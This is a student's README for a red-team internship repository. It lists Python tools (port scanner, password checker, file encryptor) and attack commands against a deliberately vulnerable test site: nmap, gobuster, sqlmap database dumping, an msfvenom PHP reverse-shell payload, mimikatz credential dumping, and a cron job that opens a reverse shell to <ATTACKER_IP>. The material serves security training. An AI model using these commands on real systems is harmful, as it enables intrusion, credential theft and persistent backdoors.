# Hack Secure Internship: Red Team Tasks  
**Student Name:** Daniel Muthama  
**University:** Maseno University  
**GitHub Repository:** [Link](https://github.com/danielmuthama23/Red-Team_Hack-Secure-Internship-Project.git)  

---

## Overview  
This repository contains scripts, commands, and methodologies used during the Hack Secure Red Team internship. Below are the codes and tools implemented for the tasks.  

---

## Tools and Scripts  

### 1. Python Port Scanner  

#### Scans open ports on a target IP address.  
    import socket
    from concurrent.futures import ThreadPoolExecutor

    def scan_port(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                print(f"[+] Port {port} is open")
                return port
        except:
            return None

    def port_scanner(ip, start_port, end_port):
        open_ports = []
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(scan_port, ip, port) for port in range(start_port, end_port+1)]
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        return open_ports

    # Example usage:

    ip = "testphp.vulnweb.com"
    start_port = 1
    end_port = 100
    open_ports = port_scanner(ip, start_port, end_port)
    print(f"Open ports: {open_ports}")

### 2. Password Strength Checker

Evaluates password strength using regex and zxcvbn.

    import re
    import zxcvbn

    def password_strength(password):
        result = zxcvbn.zxcvbn(password)
        score = result['score']
        feedback = result['feedback']['warning'] if result['feedback']['warning'] else "No feedback"
        
        strength = {
            0: "Very Weak",
            1: "Weak",
            2: "Moderate",
            3: "Strong",
            4: "Very Strong"
        }
        return f"Strength: {strength[score]}. Feedback: {feedback}"

    # Usage:
    password = input("Enter password: ")
    print(password_strength(password))

### 3. File Encryption/Decryption Tool

Encrypts/decrypts files using Fernet (AES).

    from cryptography.fernet import Fernet
    import os

    def generate_key():
        return Fernet.generate_key()

    def save_key(key, filename="secret.key"):
        with open(filename, "wb") as key_file:
            key_file.write(key)

    def load_key(filename="secret.key"):
        return open(filename, "rb").read()

    def encrypt_file(key, input_file, output_file):
        cipher = Fernet(key)
        with open(input_file, "rb") as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(output_file, "wb") as f:
            f.write(encrypted_data)

    def decrypt_file(key, input_file, output_file):
        cipher = Fernet(key)
        with open(input_file, "rb") as f:
            encrypted_data = f.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(output_file, "wb") as f:
            f.write(decrypted_data)

# Usage:
key = generate_key()
save_key(key)
encrypt_file(key, "plain.txt", "encrypted.txt")
decrypt_file(key, "encrypted.txt", "decrypted.txt")

**Command-Line Tools:**
1. Nmap Port Scanning

    nmap -sV -p- -T4 -oN nmap_scan.txt testphp.vulnweb.com

2. Gobuster Directory Bruteforcing

    gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html -o gobuster_scan.txt

3. SQL Injection with sqlmap

    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs --batch

4. Wireshark Filter for Credential Capture

    http.request.method == "POST"

**Red Team Tasks**
1. Metasploit Reverse Shell Payload

    msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=4444 -o shell.php

2. Meterpreter Post-Exploitation

    # After gaining shell:
    meterpreter > load mimikatz
    meterpreter > wdigest
3. Persistence via Cron Job

    echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" | crontab -

Usage Examples
**Port Scanner:**

    port_scanner("testphp.vulnweb.com", 1, 100)

**File Encryption:**

    encrypt_file(key, "report.docx", "encrypted_report.docx")

**SQLi Automation:**

    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms --dump

**Prerequisites**

    Python 3.x

**Libraries:**

    pip install cryptography zxcvbn


**Tools:**

Nmap, Gobuster, Wireshark, sqlmap, Metasploit.